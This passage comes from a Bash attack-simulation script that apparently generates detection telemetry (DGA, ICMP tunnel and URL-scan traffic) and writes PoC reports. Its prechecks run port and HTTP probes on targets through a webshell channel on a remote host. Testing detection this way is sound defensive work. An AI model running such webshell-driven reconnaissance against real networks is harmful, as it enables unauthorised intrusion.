    required_nx=$(safe_int "${required_nx}")
    sent=$(safe_int "${DGA_QUERY_SENT_COUNT:-0}")
    random_domains=$(safe_int "${DGA_ACTUAL_RANDOM_DOMAINS:-0}")
    (( required_nx < 150 )) && required_nx="${DETECTION_WINDOW_DGA_NXDOMAIN:-150}"
    likelihood="${likelihood^^}"
    (( nx >= required_nx && sent >= 150 && random_domains >= 150 )) && [[ "${likelihood}" == HIGH ]] && return 0
    return 1
}

icmp_tunnel_window_condition_met() {
    local arg1="$1" arg2="$2" arg3="${3:-}" arg4="${4:-}"
    # tunnel-like-session: actual_packets received_packets tunnel_like_score detection_likelihood
    if [[ -n "${arg4}" ]]; then
        local actual received score likelihood timeout_bursts bidir
        actual=$(safe_int "${arg1}")
        received=$(safe_int "${arg2}")
        score=$(safe_int "${arg3}")
        likelihood="${arg4^^}"
        timeout_bursts=$(safe_int "${ICMP_TIMEOUT_BURSTS:-0}")
        bidir=$(safe_int "${ICMP_BIDIRECTIONAL_RATIO:-0}")
        (( actual >= 80 && received >= 40 && bidir >= 50 && score >= 70 && timeout_bursts <= 1 )) && [[ "${likelihood}" == HIGH ]] && return 0
        return 1
    fi
    local sent required large
    sent=$(safe_int "${arg1}")
    required=$(safe_int "${arg2}")
    large=$(safe_int "${ICMP_LARGE_PACKETS:-0}")
    (( large >= required )) && return 0
    (( sent >= required )) && return 0
    return 1
}

log_http_detection_window_bundle() {
    local target="$1" elapsed="$2" phase="${3:-summary}"
    local required_unique=40 required_failed="${HTTP_SCAN_WINDOW_MIN_FAILED}"
    local ua_met=no url_met=no ua_likelihood="${DETECTION_LIKELIHOOD_MALICIOUS_UA:-low}"
    local url_likelihood="${DETECTION_LIKELIHOOD_URL_SCAN:-low}"
    local real_failed="${HTTP_URL_SCAN_REAL_FAILED:-0}"
    local reason=""
    if http_url_scan_window_condition_met "${URL_SCAN_UNIQUE_ATTEMPTED:-0}" "${real_failed}" \
        "${required_unique}" "${required_failed}"; then
        url_met=yes
    fi
    if malicious_ua_window_condition_met "${HTTP_UA_COVERAGE_TOTAL:-0}" "${HTTP_UA_COVERAGE_ABNORMAL:-0}"; then
        ua_met=yes
    fi
    case "${phase}" in
        plan)
            log_detection_window_plan "HTTP_URL_Scan" "${target}" "${HTTP_SCAN_WINDOW_SECONDS}" \
                "unique_urls>=${required_unique},4xx_failures>=${required_failed}" \
                "${HTTP_SCAN_UNIQUE_URL_TARGET}" \
                "single_target_concentrated_burst_stellar_${DETECTION_WINDOW_BUCKET_SECONDS}s_bucket"
            log_detection_window_plan "Malicious_User-Agent" "${target}" "${HTTP_SCAN_WINDOW_SECONDS}" \
                "malicious_ua_requests>=40" "${HTTP_SCAN_UNIQUE_URL_TARGET}" \
                "combined_with_url_scan_same_target_no_normal_ua"
            log_detection_window_progress "HTTP_URL_Scan" "${target}" "0" "0" \
                "unique_urls>=${required_unique},4xx_failures>=${required_failed}" "no"
            log_detection_window_progress "Malicious_User-Agent" "${target}" "0" "0" "malicious_ua_requests>=40" "no"
            ;;
        summary)
            reason="${HTTP_URL_SCAN_FINAL_REASON:-burst_complete}"
            log_detection_window_progress "HTTP_URL_Scan" "${target}" "${elapsed}" \
                "${URL_SCAN_UNIQUE_ATTEMPTED:-0}" "unique_urls>=${required_unique},4xx_failures>=${required_failed}" "${url_met}"
            log_detection_window_summary "HTTP_URL_Scan" "${target}" "${elapsed}" \
                "${URL_SCAN_UNIQUE_ATTEMPTED:-0}" "unique_urls>=${required_unique},4xx_failures>=${required_failed}" \
                "${url_met}" "${url_likelihood}" "${reason}"
            reason="malicious_ua_coverage abnormal=${HTTP_UA_COVERAGE_ABNORMAL:-0} total=${HTTP_UA_COVERAGE_TOTAL:-0}"
            log_detection_window_progress "Malicious_User-Agent" "${target}" "${elapsed}" \
                "${HTTP_UA_COVERAGE_TOTAL:-0}" "malicious_ua_requests>=40" "${ua_met}"
            log_detection_window_summary "Malicious_User-Agent" "${target}" "${elapsed}" \
                "${HTTP_UA_COVERAGE_ABNORMAL:-0}" "malicious_ua_requests>=40" \
                "${ua_met}" "${ua_likelihood}" "${reason}"
            ;;
    esac
}

poc_artifact_append() {
    local path="$1" line="$2"
    [[ -n "${path}" && -n "${line}" ]] || return 0
    printf '%s\n' "${line}" >> "${path}" 2>/dev/null || true
}

poc_obs_append_log() {
    poc_artifact_append "${POC_EXECUTION_LOG}" "$1"
    [[ -n "${POC_CUSTOMER_LOG}" ]] && poc_artifact_append "${POC_CUSTOMER_LOG}" "$1"
}

poc_obs_log() {
    local level="$1" msg="$2" plain prefix ts
    case "${level}" in
        DEBUG)
            [[ "${DEBUG:-false}" == true || "${POC_OBS_DEBUG}" == true ]] || return 0
            ;;
    esac
    ts=$(date +"%Y-%m-%d %H:%M:%S")
    plain="[${ts}] [${level}] ${msg}"
    poc_artifact_append "${POC_EXECUTION_LOG}" "${plain}"
    prefix=$(log_console_prefix)
    case "${level}" in
        ERROR) echo -e "${prefix}${RED}[-] ${plain}${NC}" >&2 ;;
        WARN)  echo -e "${prefix}${YELLOW}[!] ${plain}${NC}" >&2 ;;
        DECISION) echo -e "${prefix}${CYAN}${plain}${NC}" >&2 ;;
        EVIDENCE|SUMMARY) echo -e "${prefix}${GREEN}${plain}${NC}" >&2 ;;
        DEBUG) echo "${prefix}${plain}" >&2 ;;
        *)     echo "${prefix}${plain}" >&2 ;;
    esac
}

poc_obs_report_append() {
    poc_artifact_append "${POC_REPORT_CWD}" "$1"
}

poc_obs_report_init_header() {
    local src_ip user host start_ts
    [[ "${POC_REPORT_HEADER_WRITTEN}" == true ]] && return 0
    [[ -n "${POC_REPORT_CWD}" ]] || return 0
    src_ip=$(poc_obs_get_source_ip)
    user=$(id -un 2>/dev/null || printf '%s' "${USER:-unknown}")
    host=$(hostname -f 2>/dev/null || hostname 2>/dev/null || printf 'unknown')
    start_ts=$(date +"%Y-%m-%d %H:%M:%S")
    : > "${POC_REPORT_CWD}" 2>/dev/null || true
    {
        echo "# Stellar PoC Report"
        echo ""
        echo "| Field | Value |"
        echo "|---|---|"
        echo "| Run ID | ${POC_RUN_ID} |"
        echo "| Host | ${host} |"
        echo "| User | ${user} |"
        echo "| Source IP | ${src_ip} |"
        echo "| Script version | ${STELLAR_POC_VERSION:-unknown} |"
        echo "| Target range | ${TARGET_NET:-n/a} |"
        echo "| Start time | ${start_ts} |"
        echo "| Log file | \`${POC_EXECUTION_LOG}\` |"
        echo ""
        echo "## Execution timeline"
        echo ""
        echo "Stages and major events in chronological order."
        echo ""
        echo "| Time | Stage | MITRE | Telemetry | Target | Status | Detail |"
        echo "|---|---|---|---|---|---|---|"
    } >> "${POC_REPORT_CWD}" 2>/dev/null || true
    POC_REPORT_HEADER_WRITTEN=true
}

poc_obs_report_stage_event() {
    local ts="$1" stage="$2" mitre="$3" telemetry="$4" target="$5" status="$6" ctx="$7"
    [[ -n "${POC_REPORT_CWD}" ]] || return 0
    poc_obs_report_init_header
    ctx="${ctx//$'\n'/ }"
    ctx="${ctx//|/\\|}"
    poc_obs_report_append "| ${ts} | ${stage} | ${mitre} | ${telemetry} | ${target} | ${status} | ${ctx} |"
}

poc_obs_report_ensure_discovery_section() {
    [[ "${POC_REPORT_DISCOVERY_HEADER}" == true ]] && return 0
    poc_obs_report_append ""
    poc_obs_report_append "## Discovery (hosts and services)"
    poc_obs_report_append ""
    poc_obs_report_append "| Time | Host | Port | Proto | Service | State | Reason |"
    poc_obs_report_append "|---|---|---|---|---|---|---|"
    POC_REPORT_DISCOVERY_HEADER=true
}

poc_obs_report_discovery_row() {
    local ip="$1" port="$2" proto="$3" state="$4" reason="$5" service="$6"
    local ts
    ts=$(date +"%Y-%m-%d %H:%M:%S")
    poc_obs_report_ensure_discovery_section
    poc_obs_report_append "| ${ts} | ${ip} | ${port} | ${proto} | ${service} | ${state} | ${reason} |"
}

poc_obs_report_ensure_followup_section() {
    [[ "${POC_REPORT_FOLLOWUP_HEADER}" == true ]] && return 0
    poc_obs_report_append ""
    poc_obs_report_append "## Follow-up results"
    poc_obs_report_append ""
    poc_obs_report_append "| Time | Scenario | Target | Service | Classification | Decision | Skip reason | Detail |"
    poc_obs_report_append "|---|---|---|---|---|---|---|---|"
    POC_REPORT_FOLLOWUP_HEADER=true
}

poc_obs_init_artifacts() {
    local cwd ts
    [[ "${POC_OBS_INITIALIZED}" == true ]] && return 0
    cwd="$(pwd)"
    ts=$(date +%Y%m%d_%H%M%S)
    POC_RUN_ID="${POC_RUN_ID:-${ts}}"
    POC_EXECUTION_LOG="${cwd}/stellar_poc_${POC_RUN_ID}.log"
    POC_REPORT_CWD="${cwd}/stellar_poc_${POC_RUN_ID}_report.md"
    POC_CUSTOMER_LOG="${cwd}/poc.log"
    POC_CUSTOMER_REPORT="${cwd}/poc_report.txt"
    POC_CUSTOMER_VALIDATION="${cwd}/poc_validation.txt"
    POC_EVIDENCE_DIR="${cwd}/stellar_poc_${POC_RUN_ID}_evidence"
    mkdir -p "${POC_EVIDENCE_DIR}" 2>/dev/null || true
    : > "${POC_EXECUTION_LOG}" 2>/dev/null || true
    : > "${POC_CUSTOMER_LOG}" 2>/dev/null || true
    : > "${POC_CUSTOMER_REPORT}" 2>/dev/null || true
    : > "${POC_CUSTOMER_VALIDATION}" 2>/dev/null || true
    LOG_FILE="${POC_EXECUTION_LOG}"
    REPORT_MD="${POC_REPORT_CWD}"
    TIMELINE_LOG="${POC_EXECUTION_LOG}"
    POC_OBS_INITIALIZED=true
    [[ "${DEBUG:-false}" == true ]] && POC_OBS_DEBUG=true
    poc_obs_report_init_header
}

poc_obs_get_source_ip() {
    local ip=""
    if command -v ip >/dev/null 2>&1; then
        ip=$(ip -4 route get 1.1.1.1 2>/dev/null | awk '/src/ {print $7; exit}')
    fi
    [[ -z "${ip}" && -n "${ATTACKER_IP}" ]] && ip="${ATTACKER_IP}"
    printf '%s' "${ip:-unknown}"
}

poc_obs_print_run_header() {
    local src_ip user host start_ts
    poc_obs_init_artifacts
    src_ip=$(poc_obs_get_source_ip)
    user=$(id -un 2>/dev/null || printf '%s' "${USER:-unknown}")
    host=$(hostname -f 2>/dev/null || hostname 2>/dev/null || printf 'unknown')
    start_ts=$(date +"%Y-%m-%d %H:%M:%S")
    poc_obs_append_log "============================================================"
    poc_obs_append_log "POC TRAFFIC GENERATOR"
    poc_obs_append_log "============================================================"
    poc_obs_append_log ""
    poc_obs_append_log "Run ID: ${POC_RUN_ID}"
    poc_obs_append_log "Host: ${host}"
    poc_obs_append_log "User: ${user}"
    poc_obs_append_log "Source IP: ${src_ip}"
    poc_obs_append_log "Script Version: ${STELLAR_POC_VERSION}"
    poc_obs_append_log "Target Range: ${TARGET_NET}"
    poc_obs_append_log ""
    poc_obs_append_log "Start Time: ${start_ts}"
    poc_obs_append_log ""
    echo "PoC log: ${POC_EXECUTION_LOG}"
    echo "PoC report: ${POC_REPORT_CWD}"
    echo "PoC evidence: ${POC_EVIDENCE_DIR}"
}

poc_obs_print_environment_validation() {
    local tool status
    poc_obs_log "INFO" "Environment Validation"
    poc_obs_append_log ""
    for tool in nmap curl nc ssh timeout ping; do
        status="MISSING"
        command -v "${tool}" >/dev/null 2>&1 && status="OK"
        [[ "${tool}" == nmap && "${HAS_nmap:-false}" == true ]] && status="OK (remote)"
        [[ "${tool}" == ssh && "${HAS_ssh:-false}" == true ]] && status="OK (remote)"
        poc_obs_log "INFO" "tool ${tool}: ${status}"
    done
    poc_obs_append_log ""
    poc_obs_log "INFO" "hostname: $(hostname -f 2>/dev/null || hostname 2>/dev/null || echo unknown)"
    poc_obs_log "INFO" "OS: $(uname -s 2>/dev/null) $(uname -r 2>/dev/null)"
    poc_obs_log "INFO" "kernel: $(uname -r 2>/dev/null)"
    poc_obs_log "INFO" "IP addresses: $(hostname -I 2>/dev/null | tr -s ' ' || ip -4 addr show 2>/dev/null | awk '/inet /{print $2}' | tr '\n' ' ')"
    poc_obs_log "INFO" "default gateway: $(ip route 2>/dev/null | awk '/default/{print $3; exit}')"
    poc_obs_log "INFO" "DNS servers: $(grep -E '^nameserver' /etc/resolv.conf 2>/dev/null | awk '{print $2}' | tr '\n' ' ')"
    poc_obs_log "INFO" "user: $(id -un 2>/dev/null)"
    poc_obs_log "INFO" "cwd: $(pwd)"
}

poc_obs_stage_start() {
    local stage="$1" ts
    POC_STAGE_START_EPOCH["${stage}"]=$(date +%s)
    ts=$(date +"%Y-%m-%d %H:%M:%S")
    poc_obs_log "INFO" "STAGE START: ${stage}"
    poc_obs_report_stage_event "${ts}" "${stage}" "—" "stage" "—" "start" "—"
}

poc_obs_stage_end() {
    local stage="$1" start now dur ts
    start="${POC_STAGE_START_EPOCH[${stage}]:-}"
    now=$(date +%s)
    if [[ -n "${start}" ]]; then
        dur=$((now - start))
    else
        dur=0
    fi
    ts=$(date +"%Y-%m-%d %H:%M:%S")
    poc_obs_log "INFO" "STAGE END: ${stage} (${dur}s)"
    poc_obs_report_stage_event "${ts}" "${stage}" "—" "stage" "—" "end" "duration=${dur}s"
}

poc_obs_discovery_header() {
    poc_obs_append_log ""
    poc_obs_append_log "============================================================"
    poc_obs_append_log "DISCOVERY"
    poc_obs_append_log "============================================================"
    poc_obs_append_log ""
    poc_obs_append_log "Target Range: ${TARGET_NET}"
    poc_obs_append_log ""
}

poc_obs_log_discovery_service() {
    local ip="$1" port="$2" proto="${3:-tcp}" state="$4" reason="$5" service="$6" banner="${7:-}"
    local line
    line="${ip}|${port}|${proto}|${state}|${reason}|${service}|${banner}"
    POC_DISCOVERY_SERVICES_LOG+="${line}"$'\n'
    poc_obs_log "INFO" "Discovery: ${ip}:${port}/${proto} service=${service} state=${state} reason=${reason}"
    poc_obs_report_discovery_row "${ip}" "${port}" "${proto}" "${state}" "${reason}" "${service}"
    [[ -n "${banner}" ]] && poc_obs_log "INFO" "Discovery banner ${ip}:${port}: ${banner}"
}

analyze_http_000_root_cause() {
    local output="$1" exit_code="${2:-1}"
    local low
    low=$(printf '%s' "${output}" | tr '[:upper:]' '[:lower:]')
    [[ "${low}" == *"could not resolve"* || "${low}" == *"name or service not known"* || "${low}" == *"nodename nor servname"* ]] && {
        printf '%s' 'DNS resolution failed'; return 0
    }
    [[ "${low}" == *"connection timed out"* || "${low}" == *"timed out"* || "${low}" == *"timeout"* ]] && {
        printf '%s' 'TCP SYN sent — no SYN/ACK received (likely firewall drop or routing blackhole)'; return 0
    }
    [[ "${low}" == *"connection refused"* || "${low}" == *"refused"* ]] && {
        printf '%s' 'TCP connection refused by target'; return 0
    }
    [[ "${low}" == *"connection reset"* || "${low}" == *"reset by peer"* ]] && {
        printf '%s' 'Connection reset by peer'; return 0
    }
    [[ "${low}" == *"ssl"* || "${low}" == *"tls"* || "${low}" == *"certificate"* ]] && {
        printf '%s' 'TLS handshake failed or certificate error'; return 0
    }
    [[ "${low}" == *"failed to connect"* || "${low}" == *"couldn't connect"* ]] && {
        printf '%s' 'TCP connect failed before HTTP response'; return 0
    }
    (( exit_code == 127 )) && { printf '%s' 'Remote command not found (curl missing on webshell host)'; return 0; }
    (( exit_code != 0 )) && { printf '%s' "Remote command failed (exit ${exit_code})"; return 0; }
    printf '%s' 'No HTTP response — transport or webshell channel failure'
}

classify_http_status_code() {
    local code="$1"
    case "${code}" in
        2*)   printf '%s' 'http_success' ;;
        301)  printf '%s' 'http_redirect' ;;
        302|303|307|308) printf '%s' 'http_redirect' ;;
        401)  printf '%s' 'http_auth_required' ;;
        400)  printf '%s' 'http_bad_request' ;;
        403)  printf '%s' 'http_forbidden' ;;
        404)  printf '%s' 'http_not_found' ;;
        405)  printf '%s' 'http_method_blocked' ;;
        5*)   printf '%s' 'http_server_error' ;;
        000|"") printf '%s' 'unknown_failure' ;;
        *)    printf '%s' 'http_response_received' ;;
    esac
}

classify_connection_result() {
    local output="$1" exit_code="${2:-1}" http_code="${3:-}"
    local low detail
    low=$(printf '%s' "${output}" | tr '[:upper:]' '[:lower:]')
    if [[ -n "${http_code}" && "${http_code}" != "000" ]]; then
        classify_http_status_code "${http_code}"
        return 0
    fi
    if [[ "${low}" == *"http/1."* || "${low}" == *"http/2"* ]]; then
        http_code=$(sed -n 's/^[hH][tT][tT][pP]\/[0-9.]* \([0-9][0-9][0-9]\).*/\1/p' <<< "${output}" | head -n1)
        if [[ -n "${http_code}" && "${http_code}" != "000" ]]; then
            classify_http_status_code "${http_code}"
            return 0
        fi
        printf '%s' 'http_response_received'
        return 0
    fi
    [[ "${low}" == *"403"* || "${low}" == *"forbidden"* ]] && { printf '%s' 'http_forbidden'; return 0; }
    [[ "${low}" == *"401"* || "${low}" == *"unauthorized"* ]] && { printf '%s' 'http_auth_required'; return 0; }
    [[ "${low}" == *"connection refused"* || "${low}" == *"refused"* ]] && { printf '%s' 'tcp_connect_failed'; return 0; }
    [[ "${low}" == *"timed out"* || "${low}" == *"timeout"* || "${low}" == *"time out"* ]] && { printf '%s' 'tcp_timeout'; return 0; }
    [[ "${low}" == *"connection reset"* || "${low}" == *"reset by peer"* ]] && { printf '%s' 'tcp_reset'; return 0; }
    [[ "${low}" == *"filtered"* || "${low}" == *"no route"* ]] && { printf '%s' 'tcp_timeout'; return 0; }
    [[ "${low}" == *"no route to host"* ]] && { printf '%s' 'tcp_connect_failed'; return 0; }
    [[ "${low}" == *"name or service not known"* || "${low}" == *"could not resolve"* ]] && { printf '%s' 'dns_failed'; return 0; }
    [[ "${low}" == *"ssl"* || "${low}" == *"tls"* || "${low}" == *"certificate"* ]] && { printf '%s' 'tls_handshake_failed'; return 0; }
    [[ "${low}" == *"http/0.9"* || "${low}" == *"received http/0.9"* ]] && { printf '%s' 'http_proto_mismatch'; return 0; }
    [[ "${low}" == *"succeeded"* || "${low}" == *"open"* || "${low}" == *"_usable"* || "${low}" == *"connected"* ]] && { printf '%s' 'connected'; return 0; }
    (( exit_code == 0 )) && { printf '%s' 'connected'; return 0; }
    (( exit_code == 127 )) && { printf '%s' 'webshell_execution_failed'; return 0; }
    printf '%s' 'unknown_failure'
}

# Precheck records use cmd|ec|out|classification. Multiline curl/nc output breaks IFS='|' read.
poc_precheck_flatten_field() {
    local value
    value=$(printf '%s' "${1:-}" | tr '\r\n\t|' '    ')
    value="${value#"${value%%[![:space:]]*}"}"
    value="${value%"${value##*[![:space:]]}"}"
    while [[ "${value}" == *"  "* ]]; do
        value="${value//  / }"
    done
    printf '%s' "${value}"
}

poc_precheck_emit_line() {
    local cmd="$1" ec="$2" out="$3" classification="$4"
    cmd=$(poc_precheck_flatten_field "${cmd}")
    out=$(poc_precheck_flatten_field "${out}")
    printf '%s|%s|%s|%s' "${cmd}" "${ec}" "${out:-no output}" "${classification}"
}

poc_precheck_read_line() {
    local line="$1"
    local -n _cmd="$2" _ec="$3" _out="$4" _class="$5"
    _class="${line##*|}"
    line="${line%|${_class}}"
    _out="${line##*|}"
    line="${line%|${_out}}"
    _ec="${line##*|}"
    _cmd="${line%|${_ec}}"
}

decision_from_classification() {
    local classification="$1" attempted="${2:-false}" attempt_ok="${3:-false}"
    case "${classification}" in
        connected|http_success|http_response_received|http_redirect)
            if [[ "${attempted}" == true ]]; then
                [[ "${attempt_ok}" == true ]] && printf '%s' 'attempted_success' || printf '%s' 'attempted_failed'
            else
                printf '%s' 'attempted_success'
            fi
            ;;
        http_forbidden|http_auth_required|app_forbidden|app_unauthorized)
            printf '%s' 'attempted_auth_required_scan'
            ;;
        tcp_connect_failed|connection_refused) printf '%s' 'skipped_connection_refused' ;;
        tcp_timeout|network_timeout|filtered) printf '%s' 'skipped_network_timeout' ;;
        tcp_reset)          printf '%s' 'skipped_network_timeout' ;;
        no_route)           printf '%s' 'skipped_network_timeout' ;;
        dns_failed|dns_failure) printf '%s' 'skipped_unknown_reason' ;;
        tls_handshake_failed|tls_certificate_error) printf '%s' 'skipped_network_timeout' ;;
        webshell_execution_failed|application_error) printf '%s' 'skipped_script_error' ;;
        script_error)       printf '%s' 'skipped_script_error' ;;
        config_missing)     printf '%s' 'skipped_config_missing' ;;
        missing_tool)       printf '%s' 'skipped_missing_tool' ;;
        service_not_open)   printf '%s' 'skipped_service_not_open' ;;
        http_method_blocked|http_not_found|http_server_error|http_bad_request)
            if [[ "${attempted}" == true ]]; then
                [[ "${attempt_ok}" == true ]] && printf '%s' 'attempted_success' || printf '%s' 'attempted_failed'
            else
                printf '%s' 'attempted_success'
            fi
            ;;
        *)
            if [[ "${attempted}" == true ]]; then
                [[ "${attempt_ok}" == true ]] && printf '%s' 'attempted_success' || printf '%s' 'attempted_failed'
            else
                printf '%s' 'skipped_unknown_reason'
            fi
            ;;
    esac
}

skip_reason_from_decision() {
    local d="$1"
    case "${d}" in
        skipped_*) printf '%s' "${d#skipped_}" ;;
        attempted_*) printf '%s' '' ;;
        *) printf '%s' "${d}" ;;
    esac
}

poc_obs_interpretation() {
    local scenario="$1" classification="$2" decision="$3" target="$4"
    case "${decision}" in
        skipped_network_timeout|skipped_filtered)
            cat <<EOF
The ${scenario} service was discovered during scanning,
however the TCP/HTTP precheck did not complete successfully (${classification}).

The follow-up was skipped because a reliable session to the service could not be established.

This suggests firewall filtering, ACL enforcement, routing restrictions,
or asymmetric network behavior — not a script logic failure.
EOF
            ;;
        skipped_connection_refused)
            cat <<EOF
The ${scenario} service was discovered during scanning at ${target},
but the precheck received connection refused.

The follow-up was skipped because the target actively refused the connection.
This may indicate the service is down, bound to another interface, or restricted by host policy.
EOF
            ;;
        skipped_app_forbidden)
            cat <<EOF
The HTTP service at ${target} is reachable at the network layer.

The follow-up was skipped because the application returned HTTP 403 Forbidden.

This indicates application-layer access control, not network connectivity failure.
EOF
            ;;
        skipped_app_unauthorized)
            cat <<EOF
The HTTP service at ${target} is reachable but returned HTTP 401 Unauthorized.

The follow-up was limited because authentication is required by application policy.
EOF
            ;;
        skipped_missing_tool)
            cat <<EOF
The ${scenario} follow-up was skipped because a required tool is not installed on the execution host.
Install the missing dependency and re-run the PoC.
EOF
            ;;
        skipped_config_missing)
            cat <<EOF
The ${scenario} follow-up was skipped due to missing configuration (no targets or required parameters).
EOF
            ;;
        skipped_script_error)
            cat <<EOF
The ${scenario} follow-up encountered an internal script error during precheck or execution.
Review the evidence lines above and operator logs.
EOF
            ;;
        attempted_auth_required_scan)
            cat <<EOF
The HTTP service at ${target} is reachable and returned ${classification} during precheck.

External URL reconnaissance continued because HTTP 401/403 responses are valid failed-URL telemetry for detection (authentication success is not required).
EOF
            ;;
        attempted_success)
            cat <<EOF
The ${scenario} follow-up at ${target} completed successfully after precheck (${classification}).
Telemetry was generated as planned.
EOF
            ;;
        attempted_failed)
            cat <<EOF
The ${scenario} follow-up at ${target} was attempted after precheck (${classification})
but did not produce the expected telemetry outcome.
EOF
            ;;
        *)
            cat <<EOF
The ${scenario} follow-up at ${target} ended with decision=${decision} (classification=${classification}).
Review precheck evidence to determine whether environment or application policy blocked execution.
EOF
            ;;
    esac
}

poc_obs_log_followup_decision_block() {
    local scenario="$1" target="$2" scan_result="$3" precheck_cmd="$4" precheck_result="$5"
    local classification="$6" decision="$7"
    local interp
    interp=$(poc_obs_interpretation "${scenario}" "${classification}" "${decision}" "${target}")
    {
        echo ""
        echo "============================================================"
        echo "FOLLOW-UP DECISION"
        echo "============================================================"
        echo ""
        echo "Scenario:"
        echo "${scenario}"
        echo ""
        echo "Target:"
        echo "${target}"
        echo ""
        echo "Scan Result:"
        echo "${scan_result}"
        echo ""
        echo "Precheck Command:"
        echo "${precheck_cmd}"
        echo ""
        echo "Precheck Result:"
        echo "${precheck_result}"
        echo ""
        echo "Classification:"
        echo "${classification}"
        echo ""
        echo "Decision:"
        echo "${decision}"
        echo ""
        echo "Interpretation:"
        echo ""
        echo "${interp}"
        echo ""
    }
    poc_obs_log "DECISION" "Scenario=${scenario} target=${target} decision=${decision}"
    poc_obs_log "INFO" "Precheck (${classification}): ${precheck_result}"
}

poc_obs_report_followup_row() {
    local scenario="$1" target_ip="$2" target_port="$3" scan_state="$4" scan_service="$5"
    local precheck_cmd="$6" precheck_ec="$7" precheck_result="$8" decision="$9" skip_reason="${10}"
    local cmd_exec="${11}" exit_code="${12}" classification="${13}" interpretation="${14}" elapsed="${15}"
    local ts target detail
    [[ -n "${POC_REPORT_CWD}" ]] || return 0
    ts=$(date +"%Y-%m-%d %H:%M:%S")
    target="${target_ip}:${target_port}"
    interpretation="${interpretation//$'\n'/ }"
    precheck_result="${precheck_result//$'\n'/ }"
    detail="precheck_ec=${precheck_ec}; precheck=${precheck_result}; cmd=${cmd_exec:-n/a}; exit=${exit_code:-n/a}; elapsed=${elapsed:-0}s"
    detail="${detail//|/\\|}"
    poc_obs_report_ensure_followup_section
    poc_obs_report_append "| ${ts} | ${scenario} | ${target} | ${scan_service} (${scan_state}) | ${classification} | ${decision} | ${skip_reason:-—} | ${detail} |"
    if [[ "${decision}" == skipped_* ]]; then
        poc_obs_log "WARN" "Follow-up SKIP ${scenario} ${target}: ${skip_reason:-${decision}} (classification=${classification})"
    else
        poc_obs_log "INFO" "Follow-up RUN ${scenario} ${target}: ${decision} (classification=${classification}, ${elapsed:-0}s)"
    fi
}

poc_obs_count_decision() {
    local decision="$1" key
    case "${decision}" in
        attempted_success|attempted_failed) POC_FOLLOWUP_ATTEMPTED=$((POC_FOLLOWUP_ATTEMPTED + 1)) ;;
        skipped_*)
            POC_FOLLOWUP_SKIPPED=$((POC_FOLLOWUP_SKIPPED + 1))
            key="${decision#skipped_}"
            POC_SKIP_REASON_COUNTS["${key}"]=$((${POC_SKIP_REASON_COUNTS["${key}"]:-0} + 1))
            ;;
    esac
}

poc_precheck_ssh() {
    local ip="$1" port="${2:-22}"
    local cmd="nc -vz -w 3 ${ip} ${port}" out ec classification
    if [[ "${DRY_RUN}" == true ]]; then
        poc_precheck_emit_line "${cmd}" "0" "dry-run connected" "connected"
        return 0
    fi
    if [[ "${HAS_nc:-false}" != true && "${HAS_bash:-false}" != true ]]; then
        poc_precheck_emit_line "${cmd}" "127" "missing nc/bash on remote" "script_error"
        return 0
    fi
    out=$(run_webshell_quick "poc-precheck-ssh-${ip}" "${cmd} 2>&1; echo PRECHECK_EC=\$?" 2>/dev/null | tr -d '\r' || true)
    ec=$(sed -n 's/.*PRECHECK_EC=\([0-9][0-9]*\).*/\1/p' <<< "${out}" | tail -n1)
    ec=$(safe_int "${ec}")
    out=$(sed '/PRECHECK_EC=/d' <<< "${out}" | tail -n 5)
    classification=$(classify_connection_result "${out}" "${ec}")
    poc_precheck_emit_line "${cmd}" "${ec}" "${out:-no output}" "${classification}"
}

poc_precheck_http() {
    local url="$1" out ec classification http_code curl_tls="" ws_ctx
    [[ "${url}" == https://* ]] && curl_tls="-k"
    # -sS avoids stderr progress meter; max-time 7 fits inside run_webshell_quick (10s).
    local cmd="curl ${curl_tls} -sS -I --connect-timeout 5 --max-time 7 ${url}"
    if [[ "${DRY_RUN}" == true ]]; then
        poc_precheck_emit_line "${cmd}" "0" "HTTP/1.1 200 OK (dry-run)" "connected"
        return 0
    fi
    if [[ "${HAS_curl:-false}" != true ]]; then
        poc_precheck_emit_line "${cmd}" "127" "curl missing on remote" "script_error"
        return 0
    fi
    ws_ctx="poc-precheck-http-$(printf '%s' "${url}" | tr -c 'A-Za-z0-9._-' '_')"
    out=$(run_webshell_quick "${ws_ctx}" "${cmd}; echo PRECHECK_EC=\$?" 2>/dev/null | tr -d '\r' || true)
    ec=$(sed -n 's/.*PRECHECK_EC=\([0-9][0-9]*\).*/\1/p' <<< "${out}" | tail -n1)
    ec=$(safe_int "${ec}")
    http_code=$(sed -n 's/^[Hh][Tt][Tt][Pp]\/[0-9.]* \([0-9][0-9][0-9]\).*/\1/p' <<< "${out}" | head -n1)
    out=$(sed '/PRECHECK_EC=/d' <<< "${out}" | head -n 8)
    classification=$(classify_connection_result "${out}" "${ec}" "${http_code}")
    poc_precheck_emit_line "${cmd}" "${ec}" "${out:-no output}" "${classification}"
}

poc_precheck_smb() {
    local ip="$1" port="${2:-445}"
    local cmd="nc -vz -w 3 ${ip} ${port}" out ec classification
    if [[ "${DRY_RUN}" == true ]]; then
        poc_precheck_emit_line "${cmd}" "0" "dry-run connected" "connected"
        return 0
    fi
    out=$(run_webshell_quick "poc-precheck-smb-${ip}" "${cmd} 2>&1; echo PRECHECK_EC=\$?" 2>/dev/null | tr -d '\r' || true)
    ec=$(sed -n 's/.*PRECHECK_EC=\([0-9][0-9]*\).*/\1/p' <<< "${out}" | tail -n1)
    ec=$(safe_int "${ec}")
    out=$(sed '/PRECHECK_EC=/d' <<< "${out}" | tail -n 5)
    classification=$(classify_connection_result "${out}" "${ec}")
    poc_precheck_emit_line "${cmd}" "${ec}" "${out:-no output}" "${classification}"
}

poc_obs_record_followup() {
    local scenario="$1" target_ip="$2" target_port="$3" scan_state="$4" scan_service="$5"
    local precheck_cmd="$6" precheck_ec="$7" precheck_result="$8" classification="$9"
    local attempted="${10:-false}" attempt_ok="${11:-false}" cmd_exec="${12:-}" exit_code="${13:-}" elapsed="${14:-0}"
    local decision skip_reason interp target_display
    target_display="${target_ip}:${target_port}"
    decision=$(decision_from_classification "${classification}" "${attempted}" "${attempt_ok}")
    skip_reason=$(skip_reason_from_decision "${decision}")
    interp=$(poc_obs_interpretation "${scenario}" "${classification}" "${decision}" "${target_display}")
    poc_obs_count_decision "${decision}"
    poc_obs_log_followup_decision_block "${scenario}" "${target_display}" "${scan_state} ${scan_service}" \
        "${precheck_cmd}" "${precheck_result}" "${classification}" "${decision}"
    poc_obs_report_followup_row "${scenario}" "${target_ip}" "${target_port}" "${scan_state}" "${scan_service}" \
        "${precheck_cmd}" "${precheck_ec}" "${precheck_result}" "${decision}" "${skip_reason}" \
